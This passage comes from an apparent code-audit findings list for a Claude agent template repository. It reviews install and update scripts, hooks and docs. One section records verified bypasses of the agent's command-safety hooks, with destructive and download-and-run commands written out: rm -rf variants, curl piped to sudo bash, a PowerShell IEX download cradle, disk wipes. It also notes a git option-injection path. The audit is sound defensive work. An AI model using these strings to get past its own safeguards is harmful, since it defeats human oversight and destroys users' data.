  - evidence: On this machine `command -v python3` resolves to the WindowsApps stub (`.../Microsoft/WindowsApps/python3`); a stock Windows box with no real Python has the same stub for `python`, so detection succeeds and the clean die at line 65 never fires. Fix: validate candidates with `"$cand" -c 'import json, uuid'` before accepting.
- **SHOULD-FIX** — `scripts/install.sh:95` — Unquoted prefix strip `${tgt#$TARGET_PATH/}` (and `${src#$skel_claude/}` at line 419) treats the path as a glob pattern, so a target path containing `[`, `]`, `?`, or `*` fails to strip and records absolute machine paths as relpaths in the marker, silently breaking update.sh classification.
  - evidence: With TARGET_PATH=/tmp/proj[1], pattern `proj[1]/` matches literal `proj1/` not `proj[1]/`, so rel stays the full absolute path and both marker maps get absolute keys. Line 120 (`${csrc#"$HOME"}`) already uses the correct quoted form — apply it here: `${tgt#"$TARGET_PATH"/}`.
- **SHOULD-FIX** — `scripts/install.sh:194` — rollback expands "${ADDED_FILES[@]}" / "${ADDED_DIRS[@]}" (line 197) without the `:-` guard: under `set -u` on bash < 4.4 (macOS default 3.2) an empty array aborts rollback with 'unbound variable' whenever exactly one array is empty.
  - evidence: Merge install into a repo whose .claude dirs all exist: ensure_dir never fires, ADDED_DIRS stays empty; a mid-copy failure enters rollback (length check at 189 passes because ADDED_FILES is non-empty), removes files, then dies at line 197 before printing 'rollback complete'. Line 487 already uses the safe "${INSTALLED_HASHES[@]:-}" form — 194/197 should match.
- **SHOULD-FIX** — `scripts/install.sh:314` — MSYS-vs-Windows path-form split: default TARGET_PATH from `git rev-parse --show-toplevel` is `C:/...` while SOURCE_PATH is canonicalized to `/c/...`, so the `SOURCE_PATH = TARGET_PATH` self-install guard (line 325) and portable_source_path's `<self>` detection (line 116) both silently fail on Git Bash.
  - evidence: Verified live in this repo: `git rev-parse --show-toplevel` prints `C:/Users/darre/Dev/Claude-Skeleton`, `pwd -P` prints `/c/Users/darre/Dev/Claude-Skeleton`; string compare fails, so a Windows user who deletes the marker (as the line 334 die message itself instructs) and re-runs without --claude-only bypasses the guard. Fix: canonicalize the git-derived path with `cd ... && pwd -P` like the --target branch does (line 312).
- **SHOULD-FIX** — `scripts/install.sh:524` — Latent post-success rollback: under `set -o pipefail`, if any of the five counted dirs is ever absent, `find ... | wc -l` in the summary assignment exits nonzero, errexit fires inside summary(), and cleanup rolls back a fully completed install.
  - evidence: find's stderr is suppressed but its exit code still poisons the pipeline; `n_agents=$(find ... | wc -l | tr -d ' ')` failing triggers set -e after write_version_marker succeeded. Currently unreachable (verified all five template dirs contain real files) but one template reorganization away; append `|| true` inside each substitution.
- **SHOULD-FIX** — `scripts/update.sh:581` — Marker `commit` value is passed unvalidated to `git fetch origin "$commit"` — a hand-edited/hostile marker like `--upload-pack=<cmd>` becomes a git option
  - evidence: dump_marker accepts any string for commit; migrate_raw_baselines feeds it to `git fetch --quiet --depth 1 origin "$commit"` (line 581) and `worktree add ... "$commit"` (line 596), where a leading-dash value is parsed as an option (git fetch honors --upload-pack=<cmd> → arbitrary command execution from repo-tracked state). Guard with a hex check ([0-9a-f]{7,40}) or `--end-of-options`.
- **SHOULD-FIX** — `scripts/update.sh:658` — Unquoted pattern in prefix strip `${src#$skel_claude/}` — glob metacharacters in the source path corrupt relative paths
  - evidence: A checkout path containing [, ?, or * (e.g. ~/dev/skel[1]/) makes $skel_claude a glob pattern, so rel is mis-stripped and every file misclassifies/mis-targets. Everywhere else the script quotes pattern expansions (e.g. line 119 ${entry%%"$tab"*}). Fix: ${src#"$skel_claude"/}.
- **SHOULD-FIX** — `scripts/update.sh:815` — --check-remote on a pre-0.8.0 legacy marker silently upgrades it to JSON with `files: {}`, permanently defeating BACKFILL MODE
  - evidence: write_marker_json always emits out["files"] = files even when empty (line 334). After a legacy-marker user runs --check-remote, the next real update sees a files dict (dump_marker line 215 → HAS_FILES true), so maybe_announce_backfill (line 829) never sets BACKFILL_MODE: no warning, no forced interactive review, no 'marker migrated' notice, and orphan detection starts from an empty map. The R-lines get the non-empty guard for exactly this reason (comment lines 294-297) but F-lines don't.
- **SHOULD-FIX** — `scripts/update.sh:839` — BACKFILL MODE banner misstates current behavior: differing files are now classified LOCALLY_MODIFIED, not TEMPLATE_UPDATED
  - evidence: In backfill mode there are no raw baselines, so classify's fallback (lines 682-689) sets baseline = current-template hash; a file differing from the template then hits the line-695 branch → LOCALLY_MODIFIED. The banner ('Files differing from the template are classified as TEMPLATE_UPDATED') describes pre-Phase-52 behavior and tells the user to fear auto-apply for the wrong reason; help text lines 436-442 has the same stale claim.
- **SHOULD-FIX** — `scripts/update.sh:909` — With stdin at EOF (CI, piped run) the 'Copy all?' prompt for NEW files defaults to yes — files are applied non-interactively without --auto-apply
  - evidence: `read -r reply || reply="y"` (line 909): running `bash update.sh </dev/null` applies every NEW file with zero interaction, while all other prompts default to the safe choice (skip/keep/no). Inconsistent failure-mode default; EOF should mean skip, matching lines 948, 1029, 1069.
- **COSMETIC** — `.claude/scripts/commit.sh:19` — Extra args beyond $1 are silently dropped, defeating the guard's purpose for a common miscall shape
  - evidence: `commit.sh "msg" README.md` passes the guards (arg 2 never checked) and commits with just "msg" — the exact manager mistake the path-shape guard exists to catch, but only when the path lands in arg 1
- **COSMETIC** — `.claude/scripts/deploy.sh:21` — Extension guard rejects legitimate flag values, e.g. `--config=deploy.yml` as the first deploy flag
  - evidence: `echo '--config=deploy.yml' | grep -qE '\.(yml)$'` matches → exit 2, though the arg is a flag (contains '='), not a stray filename
- **COSMETIC** — `.claude/scripts/deploy.sh:28` — git diff-index without a preceding `git update-index --refresh` can false-positive on stat-dirty (touched-but-identical) files, blocking a genuinely clean deploy
  - evidence: After a checkout/clone tool touches mtimes, `git diff-index --quiet HEAD --` returns nonzero on content-identical files until the index stat cache refreshes; script then refuses with 'uncommitted changes' while `git status` shows clean
- **COSMETIC** — `.claude/scripts/plugin-context-matcher.sh:163` — Malformed manifest (missing frontmatter fences) dies via assert/StopIteration raw traceback rather than the script's own error style
  - evidence: A manifest without a closing '---' makes `next()` at line 164 raise StopIteration; the wrapper reports only 'verdict pass failed (python rc=1)' plus a traceback — loud, but off-register for a dispatched tool that elsewhere prints prefixed one-liners
- **COSMETIC** — `.claude/scripts/plugin-quality-check.sh:84` — Candidate mode with no working python exits 0 with zero output, which a standalone caller cannot distinguish from a clean audit
  - evidence: `[ -n "$PYBIN" ] || exit 0` applies in candidate mode too; the header (lines 74-76) names this exact misreport risk but the no-python branch still takes the silent path rather than an error line to stderr (in practice masked when invoked by the matcher, which needs python itself)
- **COSMETIC** — `.claude/scripts/plugin-quality-check.sh:178` — resolve_untouched with --plugin-dir override wrongly resolves real installed-plugin observations
  - evidence: A test run `--plugin-dir /tmp/synthetic` emits only synthetic pattern_ids, then the full resolve pass (installed mode, line 474-475) stamps resolved_at on every genuine code-quality-auditor observation absent from the synthetic scan — test flag mutates production observation state
- **COSMETIC** — `.claude/scripts/receipt-render.sh:75` — launch_url is interpolated into a PowerShell single-quoted string without the ''-escaping applied to ps_text — a project path containing an apostrophe breaks the toast
  - evidence: ps_text gets `sed "s/'/''/g"` (line 62) but launch_url (derived from $OUT_DIR, i.e. the project path) does not; a path like C:\Users\O'Brien\proj makes the PS command a syntax error, swallowed by `|| true` — silent toast loss, no injection beyond the user's own path
- **COSMETIC** — `.claude/scripts/receipt-render.sh:659` — chafa image leg runs before the python render, so it displays the previous receipt's stale latest-tight.png next to the new ANSI card
  - evidence: Line 659 shows $OUT_DIR/latest-tight.png, then line 665 renders the new receipt — when a PNG producer eventually exists, --ansi output pairs an old image with new text (dormant today per the comment, but the ordering is already wrong)
- **COSMETIC** — `.claude/scripts/receipt-render.sh:688` — cut -c1-120 truncates the toast text at a byte-agnostic character boundary that can split a UTF-8 multibyte sequence
  - evidence: A verdict whose 120th column lands mid-em-dash (receipts here use '—' routinely) hands PowerShell a mangled trailing byte in the notification text
- **COSMETIC** — `.claude/scripts/share-disable.sh:12` — No guard on ROOT: if the `cd` in the command substitution fails, ROOT is empty and the script silently reports 'not configured' against /.claude/share-config.json
  - evidence: ROOT="$(cd "$(dirname "$0")/../.." 2>/dev/null && pwd)" with errors discarded; line 50's -f check on "/.claude/share-config.json" then exits 0 with a wrong message
- **COSMETIC** — `.claude/scripts/share-disable.sh:60` — shared-memory-git.sh is sourced without an existence check; if missing, `smg_ensure_clone` becomes command-not-found (127) and the user sees the misleading 'could not clone remote' die instead of 'library missing'
  - evidence: `. "$ROOT/.claude/lib/shared-memory-git.sh"` under set -uo (no -e) continues past a failed source; line 83's || die masks the real cause
- **COSMETIC** — `.claude/scripts/share-enable.sh:34` — marker_field has no try/except (unlike share-disable's json_field), so a corrupt or hand-edited .skeleton-version dumps a raw python traceback to stderr followed by the misleading 'no install_uuid — backfill' die
  - evidence: echo 'not json' > .claude/.skeleton-version; run share-enable.sh <url> -> json.JSONDecodeError traceback, then die at line 57 with the wrong remedy
- **COSMETIC** — `.claude/scripts/share-enable.sh:71` — git clone stderr is discarded (2>/dev/null), so auth failures, DNS errors, and URL typos all collapse into the generic 'could not clone remote' with no actionable detail
  - evidence: With GIT_TERMINAL_PROMPT=0 an auth-required HTTPS remote fails; the user can't distinguish bad-URL from bad-credentials from offline
- **COSMETIC** — `.claude/scripts/share-status.sh:36` — Corrupt share-config.json produces an unguarded json.load traceback and nonzero exit rather than a friendly one-line error, unlike every other failure mode in the share suite
  - evidence: echo '{' > .claude/share-config.json; bash share-status.sh -> JSONDecodeError traceback; the marker read at lines 39-45 is try/except-guarded but the config read is not
- **COSMETIC** — `.claude/scripts/shared-memory-push.sh:9` — Header usage block documents only the no-arg and --manual modes; --preview (implemented at line 29 and shipped as /share-preview) is missing from the usage comment
  - evidence: Lines 9-11 list two usages; `case "${1:-}" in --manual|--preview` accepts three
- **COSMETIC** — `.claude/scripts/shared-memory-push.sh:55` — record_last_push stores `git ls-files | wc -l` — total tracked files in the whole shared tree (all installs' events) — under the key 'files_pushed', which share-status.sh then renders as 'Files pushed: N', overstating what this install pushed once multiple installs share the remote
  - evidence: The say message honestly reads 'N file(s) tracked' but the marker key and share-status.sh line 60 label ('Files pushed') claim per-push semantics
- **COSMETIC** — `.claude/scripts/task-watchdog.sh:293` — One malformed numeric field (e.g. durationMs as a decimal string) raises ValueError and aborts the whole PYIMPL scan; the warning is emitted but the marker is not written, so the same poison transcript re-fails at every session start until a newer session displaces it as 'prior'
  - evidence: int('123.4') raises; no per-event try around the int() coercions at lines 293/317, unlike the json.loads and timestamp parsing which are guarded
- **COSMETIC** — `scripts/install.sh:200` — After a failed --mode=replace run, rollback prints 'rollback complete' but files destroyed by the overwrite path (line 392, no backup taken) are not restored, and rmdir only removes the leaf dir recorded by ensure_dir so `mkdir -p` intermediate parents linger.
  - evidence: process_file overwrite does `cp -p` with no backup and records nothing in ADDED_FILES; rollback loops only over added files/dirs, so the target is left in a mixed old/new state while the message implies full restoration.
- **COSMETIC** — `scripts/install.sh:316` — In the default-target branch, git is invoked at line 314 before the `command -v git` existence check at line 316, so a machine without git dies with the misleading 'not in a git repository' instead of 'git not on PATH'.
  - evidence: Line 314 `git rev-parse --show-toplevel 2>/dev/null` fails with exit 127 when git is absent; the || die fires first with the wrong diagnosis. Move the command -v check above the branch.
- **COSMETIC** — `scripts/install.sh:560` — The gitignored `.first-run` flag is written before summary() but never tracked in ADDED_FILES, so an interrupt/failure during summary rolls back the marker and all files yet leaves an orphan `.first-run`, which can trigger the one-time SessionStart welcome in a repo with no actual install.
  - evidence: Ctrl-C between line 560 and end of summary: cleanup rollback removes ADDED_FILES (including the marker via line 494) but `.first-run` survives; append it to ADDED_FILES on the non-dry-run write.
- **COSMETIC** — `scripts/update.sh:79` — marker_hash_* embed literal TAB characters in parameter expansions (lines 79, 89, 101, 717) while raw_baseline_* deliberately use tab=$'\t'
  - evidence: The comment at line 114 acknowledges the safer style ('avoid embedding literal tabs'); an editor retab or copy-paste of the older helpers silently breaks the path→hash map. Align the older helpers with the quoted-$tab style.
- **COSMETIC** — `scripts/update.sh:366` — ADDED_DIRS is tracked (lines 23, 871) but rollback never removes created directories
  - evidence: After a failed run that added new files in new dirs, rollback rm's the files but leaves the empty directories behind; either rmdir them in rollback or drop the dead bookkeeping.
- **COSMETIC** — `scripts/update.sh:394` — On Ctrl-C the cleanup trap runs twice (INT handler's `exit` re-triggers the EXIT trap)
  - evidence: trap cleanup EXIT INT TERM (line 394) + `exit "$exit_code"` at line 357: rollback re-runs and 'update failed — restoring previous state' prints twice; the [ -f ] guards make it functionally harmless. Standard fix: `trap - EXIT` inside cleanup, or trap INT/TERM to `exit` only.
- **COSMETIC** — `scripts/update.sh:908` — --dry-run still blocks on interactive prompts despite help text promising 'print the update plan without changing anything'
  - evidence: apply_new/apply_template_updates/apply_orphans prompt before consulting DRY_RUN (e.g. line 908 vs. 914), so a dry run over a real terminal requires answering questions; also apply_orphans in dry-run returns without counting APPLIED (line 1073), inconsistent with apply_new's dry-run counting (line 914).
- **COSMETIC** — `scripts/update.sh:1116` — After a clone-based update, marker `source` records the deleted TMP_CLONE_DIR path
  - evidence: resolve_skeleton_root sets SOURCE_PATH to a mktemp dir that cleanup deletes; write_version_marker persists it via portable_source_path (a temp path is neither <self> nor under $HOME on most systems), so the migration fallback at line 578 can never use it. Harmless but misleading provenance.
- **COSMETIC** — `scripts/update.sh:1137` — Typo 'entrie(s)' in user-facing output (lines 1137 and 1174)
  - evidence: printf 'match-rebaseline: %s entrie(s)…' — should be 'entry(ies)' or just 'entries'.

### Wave F findings

- **SHOULD-FIX** — `.claude/captures/README.md:37` — Producers section lists only workflow-suggester, but artifact-fit-analyzer (Phase 56) also writes captures — proven by the shipped capture 6f7e14b7...md in this very directory, which self-describes 'Producer: artifact-fit-analyzer (Phase 56, non-observation producer — no observation file backs this capture)'.
  - evidence: Line 37: '**`workflow-suggester`** — drafts captures from observations...' is the sole producer entry; .claude/captures/6f7e14b7176e480c04f38c4383ca09763bdc2b9015ac4eedcaeba3ca6e59cac8.md lines 14-15 name artifact-fit-analyzer as producer. The line-7 claim that 'the filename matches the pattern_id of the observation' also fails for this non-observation-backed capture.
- **SHOULD-FIX** — `.claude/telemetry/README.md:10` — Claims the cross-install summary lives at '.claude/observations/token-telemetry-<session_id>.json', but the generator now writes hash-named '<pattern_id>.json' observations — the token-telemetry-* naming is explicitly the OLD scheme per the generator's own comments, and zero files matching it exist among 224 observations.
  - evidence: .claude/lib/generate-session-telemetry.sh:475-477 comment: 'The old human-readable token-telemetry-<session_id>.json ... pattern_id stays sha256(pattern_type + signature)'; ls .claude/observations/ | grep -c token-telemetry returns 0. The same stale path repeats at line 24 (Privacy section). Contradicts observations/README.md's '<pattern_id>.json' contract.
- **SHOULD-FIX** — `docs/PLUGIN-INSTALLS-v1.1.4.md:31` — Verbatim installed_plugins.json quote freezes the operator's Windows username in a machine-absolute path in a public-repo doc.
  - evidence: "installPath": "C:\\Users\\darre\\.claude\\plugins\\cache\\claude-plugins-official\\42crunch-api-security-testing\\1.0.1" — contrast with docs/AUDIT-v1.1.4-cc-side.md line 38, which redacted the same marker field to 'source: <project-root>'. The repo's own Phase 81 'marker privacy' work (per docs/AUDIT-2026-07-27-spotter-state.md line 92) shows this class was later treated as ship-blocking; redact to <home>\.claude\... without losing the record's meaning.
- **SHOULD-FIX** — `docs/PLUGIN-INSTALLS-v1.1.4.md:564` — Second verbatim installPath quote (claude-mem 13.2.0 diff) repeats the same username-bearing absolute path.
  - evidence: "installPath": "C:\\Users\\darre\\.claude\\plugins\\cache\\thedotmack\\claude-mem\\13.2.0" — same class as line 31; both are the only 'darre' hits across all eight reviewed files (grep-verified).
- **SHOULD-FIX** — `experiments/confidence/ANALYSIS.md:51` — The chance-floor caption's parenthetical values contradict the table's own computed column: caption says k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345, but the exact computation (and the table column) gives 0.656, 0.525, 0.410, 0.328.
  - evidence: Independently recomputed E[modal count]/N for N=7 uniform draws: k=2 -> 0.656, k=3 -> 0.525, k=5 -> 0.410, k=9 -> 0.328 — matching every 'chance floor' cell in the table (lines 19-49) and disagreeing with all four caption values on line 51. A stranger checking the caption against the table sees the analysis contradict itself; the RED verdict is unaffected.
- **SHOULD-FIX** — `experiments/confidence/analysis.py:337` — Hardcoded chance-floor values in the md.append caption string (k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345) are wrong; the script's own exact_modal_floor computes 0.656, 0.525, 0.410, 0.328. The caption should be generated from exact_modal_floor instead of hardcoded.
  - evidence: Line 336-337: md.append("\nChance floor = exact E[modal count]/N for uniform answers at N=7 (k=2: 0.651, k=3: 0.527, k=5: 0.423, k=9: 0.345)..."). exact_modal_floor(2)=0.65625, (3)=0.525, (5)=0.410, (9)=0.328 per independent recomputation, and those computed values are what the table rows emit at line 335.
- **SHOULD-FIX** — `template/.claude/captures/README.md:37` — Same as dogfood copy: producers list omits artifact-fit-analyzer (Phase 56), which the template also ships as a capture producer.
  - evidence: diff confirms template twin identical to .claude/captures/README.md; template/.claude/agents/05_meta ships artifact-fit-analyzer per the skeleton-version file map.
- **SHOULD-FIX** — `template/.claude/telemetry/README.md:10` — Same as dogfood copy: stale '.claude/observations/token-telemetry-<session_id>.json' path at lines 10 and 24; shipped generator writes hash-named <pattern_id>.json.
  - evidence: diff confirms template twin identical to .claude/telemetry/README.md.
- **SHOULD-FIX** — `template/PLUGINS.md.template:5` — References docs/PHILOSOPHY.md unconditionally, but the template ships no PHILOSOPHY.md to target projects (template/docs/ contains only ARCHITECTURE, SESSION_LOG, STATUS templates) — so on every install this points at a file that does not exist. ARCHITECTURE.md.template hedges the same reference with '(if present)'; this file should too, or link the skeleton repo's copy.
  - evidence: Line 5: 'This file is the *plugin discipline* record described in `docs/PHILOSOPHY.md` ("Plugin evaluation discipline").' ls template/docs/ shows ARCHITECTURE.md.template, SESSION_LOG.md.template, STATUS.md.template only; PHILOSOPHY.md exists only at the skeleton repo's docs/.
- **COSMETIC** — `docs/INSTALLATION.md:305` — Uninstall file list omits PLUGINS.md and docs/ARCHITECTURE.md, both of which the template also installs (template/PLUGINS.md.template, template/docs/ARCHITECTURE.md.template).
  - evidence: Lines 304-306 list only 'rm -f CLAUDE.md CLAUDE_MANAGER.md ROUTING.md' plus a comment naming docs/STATUS.md and docs/SESSION_LOG.md; template/ ships PLUGINS.md.template and docs/ARCHITECTURE.md.template which land on targets and would be left behind.
- **COSMETIC** — `docs/PHILOSOPHY.md:21` — Section-routing example names a 'code-reviewer' agent as if it were a concrete shipped route; no such agent exists in .claude/agents/ (the audit lane ships audit-helper) and ROUTING.md has no code-reviewer entry.
  - evidence: Line 21: 'A code review goes to the `code-reviewer` agent' — ls .claude/agents/02_audit/ shows only audit-helper.md; grep for code-reviewer in ROUTING.md returns nothing. Reads as a concrete handler to a stranger, in a paragraph that stresses routing is 'explicit... not vibes'.
- **COSMETIC** — `docs/PHILOSOPHY.md:58` — 'Today this is enforced by review, not by code' is partially stale: plugin-quality-check.sh (self-described 'v1.1.4 first plugin-verification component') and the plugin-discovery checklist now automate parts of plugin verification, though the pre-add 5-question check itself remains manual.
  - evidence: .claude/scripts/plugin-quality-check.sh header: 'read-only auditor of installed plugins... Implements 3 heuristics... first plugin-verification component; composes with cruft-checker + drift-checker as the project-level audit triad.'
- **COSMETIC** — `experiments/confidence/real_manifest.json:6` — _meta.build_status still says 'Capture pending.' but the capture ran and resolved RED per ANALYSIS.md — stale relative to the shipped state of the experiment.
  - evidence: "build_status": "Complete: 31 tasks (6 control / 5 stress / 20 gap). Capture pending." — while README.md and ANALYSIS.md in the same directory record the capture as complete and the RED verdict as final.
- **COSMETIC** — `experiments/reviewer-behavior/DESIGN.md:158` — The feasibility table (and line 106's parenthetical) still carries the 2026-07-07 count of ~80 ExitPlanMode events for signal v, while the 2026-07-21 amendment's restated baseline (line 143) records v = 370 — both phrased as 'the current window' with no note that the table predates the amendment.
  - evidence: Line 106: 'record 80 ExitPlanMode events in the current window'; line 158: '~80 gaps measured by the optimizer's first pass'; line 143: 'v = 370 ExitPlanMode events'. A stranger reading the feasibility table alone gets the stale count; a one-word '(at lock)' qualifier on the table would resolve it without touching the locked gate language.

### Wave B findings

- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-bash-safety.sh:104` — strip_bash_heredocs treats any `<<IDENT` on a line — including inside a comment, a quoted string, or a `<<<` here-string — as a heredoc opener, blanking every subsequent line so the pattern scan never sees it.
  - evidence: Verified against the live hook: `# note <<EOF\nrm -rf /` => allow; `echo "see <<EOF for docs"\nrm -rf /` => allow; `cat <<<HELLO\nrm -rf /` => allow (regex matches the 2nd+3rd `<` of `<<<`). Baseline `rm -rf /` => deny.
- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-bash-safety.sh:148` — Fail-OPEN when the lib file exists but is empty/truncated/syntax-broken: under bash 5 `"${ARR[@]}"` on an unset array is empty even with `set -u`, so the loop body never runs and every command is allowed with no signal.
  - evidence: Verified: with CLAUDE_PROJECT_DIR pointed at a dir containing a zero-byte .claude/lib/destructive-bash-patterns.sh, `rm -rf /` => `permissionDecision: allow`, exit 0. Contradicts the file header's "Fail-closed" contract (line 10); a partial clone/copy of this template silently disarms the hook.
- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-powershell-safety.sh:108` — strip_ps_herestrings opens a here-string on ANY line ending in `@"` or `@'`, including inside ordinary quoted text, blanking every following line until a closer that may never come.
  - evidence: Verified: `Write-Host "mail a@"\nRemove-Item -Recurse -Force C:\foo` => allow, while the same Remove-Item alone => deny.
- **BLOCKER-for-strangers** — `.claude/hooks/pretooluse-powershell-safety.sh:156` — Same fail-OPEN as the Bash hook when destructive-powershell-patterns.sh is present but empty/corrupt — unset array under bash 5 yields a zero-iteration loop and a blanket allow.
  - evidence: Confirmed by the equivalent Bash-hook test (zero-byte lib => allow, exit 0); the code path here is identical (source at line 45, loop at 156, no post-source array-populated assertion).
- **BLOCKER-for-strangers** — `.claude/lib/destructive-bash-patterns.sh:17` — The `rm -rf` pattern is defeated by flag order, flag splitting, long flags, or any non-space delimiter before `rm`.
  - evidence: All verified => allow against the live hook: `rm -fr /`, `rm -r -f /`, `rm --recursive --force /`, `echo hi;rm -rf /`, `(rm -rf /)`, `\rm -rf /`. Only the literal ` rm -rf ` form denies. Fix shape: anchor `(^|[^[:alnum:]_./-])` and match `-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r|--recursive`.
- **BLOCKER-for-strangers** — `.claude/lib/destructive-powershell-patterns.sh:19` — PowerShell accepts unambiguous parameter-name prefixes, but the regex only matches `-r`/`-recurse` and `-f`/`-force` exactly, so abbreviated flags bypass a genuinely destructive delete.
  - evidence: Verified: `Remove-Item -rec -for C:\Windows` => allow (PowerShell executes this identically to `-Recurse -Force`), while `Remove-Item C:\Windows -Recurse -Force` => deny. Fix: `-r(e(c(u(r(s(e)?)?)?)?)?)?` style prefix matching.
- **SHOULD-FIX** — `.claude/hooks/precompact-backup.sh:15` — Backups accumulate forever with no pruning — three files per auto-compact, and SESSION_LOG.md is a growing document, so the gitignored precompact-backups/ dir grows without bound on a long-lived install
  - evidence: Every PreCompact fire copies STATUS.md + SESSION_LOG.md + CLAUDE.md with a unique UTC timestamp suffix and nothing ever deletes old ones; a heavy multi-compact-per-day project stores hundreds of copies of its largest doc within months.
- **SHOULD-FIX** — `.claude/hooks/precompact-backup.sh:15` — BACKUP_DIR and the three source paths are cwd-relative, not anchored to CLAUDE_PROJECT_DIR like the sibling hooks
  - evidence: If hook cwd differs from project root, the script silently backs up nothing (docs/STATUS.md not found) and mkdir -p creates a stray .claude/agent-memory/precompact-backups tree in the wrong directory — the ${CLAUDE_PROJECT_DIR:-$PWD} pattern used at sessionstart-cost-summary.sh:21 fixes both.
- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:34` — The lib-missing fail-closed payload is hand-built with printf and interpolates $LIB unescaped — a Windows-style CLAUDE_PROJECT_DIR produces invalid JSON escapes, so the deny may not be parsed at all.
  - evidence: Verified: CLAUDE_PROJECT_DIR='C:\no\such\dir' emits `...lib missing at C:\no\such\dir/.claude/...` and `jq .` on the output reports INVALID JSON. Same defect in the jq-missing branch (line 116) if the reason ever gains a path.
- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:64` — The `git commit -m` carve-out redacts the message body but not command substitutions inside it, which the shell still executes.
  - evidence: Verified: `git commit -m "$(rm -rf /tmp/x)"` => allow. The sed replaces the quoted body with "X", but bash expands `$(...)` before git ever runs.
- **SHOULD-FIX** — `.claude/hooks/pretooluse-bash-safety.sh:132` — Cross-shell blind spot: the Bash hook applies only Bash patterns, so a destructive PowerShell command launched from Bash passes.
  - evidence: Verified: tool_name=Bash with `powershell.exe -c "Remove-Item -Recurse -Force C:\Users\darre\Dev"` => allow. Symmetric hole in the PowerShell hook (`bash -c "rm -rf ..."` => allow).
- **SHOULD-FIX** — `.claude/hooks/pretooluse-powershell-safety.sh:40` — Hand-built lib-missing deny payload interpolates $LIB into JSON without escaping; Windows backslash paths make the payload unparseable.
  - evidence: Same construction as the Bash hook line 34, which was verified to emit INVALID JSON for CLAUDE_PROJECT_DIR='C:\no\such\dir'.
- **SHOULD-FIX** — `.claude/hooks/sessionend-cost-proposals.sh:179` — The human-disposition gate is just field presence — any writer of a *.draft.json can set status 'approved'/'applied' plus a non-empty review_note and it folds into the ledger with that status preserved, no human in the loop
  - evidence: Lines 179-182: disposed = status in ('approved','applied','rejected'); reviewed = non-empty review_note string; the comment asserts 'the pair only a review writes' but nothing verifies provenance, so a buggy or prompt-injected producer that stages a draft with both fields self-approves through the seam, undercutting the stated 'nothing self-approves through the fold' invariant.
- **SHOULD-FIX** — `.claude/hooks/sessionend-observe.sh:33` — ${CLAUDE_PROJECT_DIR:?...} aborts the hook with exit 1 before any work when the var is unset — the only hook in the suite that hard-fails instead of falling back
  - evidence: Run the hook without CLAUDE_PROJECT_DIR (manual invocation, or any harness that doesn't export it): bash errors 'CLAUDE_PROJECT_DIR not set' and exits 1; sessionstart-cost-summary.sh:21 and sessionend-cost-proposals.sh:25 both use ${CLAUDE_PROJECT_DIR:-$PWD} for exactly this case.
- **SHOULD-FIX** — `.claude/hooks/sessionstart-rules.sh:41` — All paths (settings.json, scripts, markers, .first-run) are cwd-relative while sibling hooks use ROOT="${CLAUDE_PROJECT_DIR:-$PWD}" and settings.json invokes via absolute $CLAUDE_PROJECT_DIR paths
  - evidence: If the hook's cwd ever differs from the project root, line 46 '[ ! -f .claude/settings.json ] && exit 0' silently skips rule re-injection, and line 116 writes .claude/.last-audit-nudge into whatever cwd is — sessionstart-cost-summary.sh:21 shows the pattern the suite already standardized on.
- **SHOULD-FIX** — `.claude/lib/destructive-bash-patterns.sh:22` — Pipe-to-shell pattern only catches a bare `bash`/`sh` immediately after the pipe, missing the two most common real forms.
  - evidence: Verified => allow: `curl -s http://x.sh | sudo bash` and `eval "$(curl -s http://x.sh)"`.
- **SHOULD-FIX** — `.claude/lib/destructive-bash-patterns.sh:25` — Device-destruction patterns are hardcoded to legacy `/dev/sd[a-z]` naming, so NVMe targets pass.
  - evidence: Verified => allow: `dd if=/dev/zero of=/dev/nvme0n1` (line 25 requires `of=/dev/sd[a-z]`) and `mkfs.ext4 /dev/nvme0n1p1` (line 26 requires `/dev/[a-z]+` with no digits).
- **SHOULD-FIX** — `.claude/lib/destructive-powershell-patterns.sh:19` — Cmdlet-name-only matching means equivalent .NET and cmd.exe delete routes are invisible.
  - evidence: Verified => allow: `[System.IO.Directory]::Delete("C:\foo",$true)` and `cmd /c rd /s /q C:\foo`.
- **SHOULD-FIX** — `.claude/lib/destructive-powershell-patterns.sh:23` — The download-cradle pattern requires a literal `iwr|iex` pipe and misses the standard WebClient one-liner and system-file overwrite shapes.
  - evidence: Verified => allow: `IEX (New-Object Net.WebClient).DownloadString("http://x/a.ps1")` and `Set-Content C:\Windows\System32\drivers\etc\hosts -Value evil`.
- **SHOULD-FIX** — `.claude/lib/generate-session-telemetry.sh:322` — session_id is used unvalidated as a filename component (also line 425), so a hostile transcript sessionId or CLAUDE_HOOK_SESSION_ID like '../../x' writes outside .claude/telemetry/ — violates the repo's own path-shape-guards-before-mutation rule.
  - evidence: events_path = os.path.join(events_dir, f'{session_id}.jsonl'); session_id comes from ev['sessionId'] (line 261-262) or env argv[7] with no character/shape check, unlike the observation file which uses a sha256 pattern_id.
- **SHOULD-FIX** — `.claude/lib/redact-capture.sh:70` — Redaction misses common secret shapes before content leaves the project: PASSWORD=/SECRET=/PASS= assignments, colon-form keys (api_key: sk-..., in YAML/JSON), and any token under 32 chars that isn't in KEY=/TOKEN=/Bearer form passes through unredacted.
  - evidence: Only [A-Za-z_]*KEY=\S+, [A-Za-z_]*TOKEN=\S+, Bearer, Authorization:, home paths, and 32+-char base64 runs are matched (lines 70-78); 'PASSWORD=hunter2' or 'api_key: abc123' in a capture body ships verbatim via body_redacted.
- **SHOULD-FIX** — `.claude/lib/shared-memory-lib.sh:24` — SM_PY probe is presence-only (command -v), so the Windows Store python execution-alias stub passes sm_have_python and every downstream python call fails with misleading REFUSED/malformed errors — the exact 'silent-inert' class this repo fixed by execution-probing in generate-session-telemetry.sh and receipt-render.sh (Phase 63).
  - evidence: if command -v python >/dev/null 2>&1; then SM_PY="python" — no `"$_cand" -c 'pass'` validation; on a stock Windows box with the Store alias, redact-capture.sh returns 3 (malformed frontmatter) for every capture instead of 5 (no python).
